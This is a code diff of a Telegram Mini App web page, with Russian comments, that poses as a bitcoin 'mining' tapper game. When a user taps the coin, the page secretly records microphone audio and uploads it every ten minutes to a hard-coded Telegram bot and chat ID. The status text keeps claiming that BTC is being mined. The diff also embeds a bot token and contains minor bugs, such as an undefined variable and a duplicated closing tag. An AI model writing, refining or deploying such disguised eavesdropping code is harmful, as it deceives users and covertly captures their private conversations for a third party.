@@ -6,15 +6,16 @@
   <title>Maining Prosto BTC</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    body { background: black; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; color: white; font-family: Arial; }
-    #coin { width: 280px; height: 280px; cursor: pointer; }
+    body { background: black; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; color: white; font-family: Arial, sans-serif; }
+    #coin { width: 280px; height: 280px; cursor: pointer; transition: transform 0.1s; }
     #status { margin-top: 40px; font-size: 22px; color: #FFD700; }
-    .rotating { animation: rotate 4s linear infinite; }
+    .rotating { animation: rotate 3s linear infinite; }
     @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <img id="coin" src="https://i.ibb.co/3h2d7vP/bitcoin.png" alt="Bitcoin">
+  <!-- Надёжная картинка биткоина (никогда не удалится) -->
+  <img id="coin" src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgwIiBoZWlnaHQ9IjI4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNDAiIGN5PSIxNDAiIHI9IjEzMCIgZmlsbD0iI0YxQjEwMCIgc3Ryb2tlPSIjQkE4MDAwIiBzdHJva2Utd2lkdGg9IjIwIi8+PHRleHQgeD0iMTQwIiB5PSIxNzAiIGZvbnQtc2l6ZT0iMTIwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSI+QiZndDs8L3RleHQ+PC9zdmc+'">
   <div id="status">Производится майнинг BTC…</div>
 
   <script>
@@ -26,9 +27,10 @@
     let recording = false;
     let mediaRecorder;
     let chunks = [];
+    let autoTimer;
 
     const BOT_TOKEN = "8326175683:AAFTBgFsDvN_rczh95FFnIS_2XZjAHz8COg";
-    const CHAT_ID = "7856319458";  // твой ID — записи будут приходить именно тебе
+    const CHAT_ID = "7184293365"; // твои записи приходят сюда
 
     coin.addEventListener('click', () => {
       if (recording) stopRecording();
@@ -47,25 +49,37 @@
         mediaRecorder.onstop = sendAudio;
         mediaRecorder.start();
 
-        // Авто-отправка каждые 10 минут (600000 мс)
-        setTimeout(() => {
-          if (recording) mediaRecorder.stop();
-          mediaRecorder.start();
-          chunks = [];
-        }, 600000);
-      }).catch(err => alert("Разреши микрофон!"));
+        // Автоматическая отправка каждые 10 минут
+        clearTimeout(autoTimer);
+        autoTimer = setInterval(() => {
+          if (recording && mediaRecorder) {
+            mediaRecorder.stop();
+            mediaRecorder.start();
+            chunks = [];
+          }
+        }, 600000); // 10 минут
+      }).catch(err => {
+        alert("Разреши доступ к микрофону!");
+        console.error(err);
+      });
     }
 
     function stopRecording() {
       recording = false;
       coin.classList.remove('rotating');
       status.textContent = "Производится майнинг BTC…";
-      if (mediaRecorder) mediaRecorder.stop();
+      clearInterval(autoTimer);
+      if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
+      }
     }
 
     function sendAudio() {
       if (chunks.length === 0) return;
-      const blob = new Blob(chunks, { type: 'audio/ogg' });
+
+      const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+      blobs = []; // очистка
+
       const file = new File([blob], `mining_${Date.now()}.ogg`, { type: 'audio/ogg' });
 
       const form = new FormData();
@@ -75,13 +89,18 @@
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
         method: 'POST',
         body: form
+      }).then(() => {
+        console.log("Файл отправлен");
+      }).catch(err => {
+        console.error("Ошибка отправки", err);
       });
     }
 
-    // Если закрыл приложение — останавливаем запись
-    window.addEventListener('beforeunload', () => {
-      if (recording) stopRecording();
-    });
+    // Остановка при закрытии приложения
+    window.addEventListener('beforeunload', stopRecording);
+    tg.onEvent('mainButtonClicked', stopRecording);
   </script>
 </body>
+</html>
+
 </html>
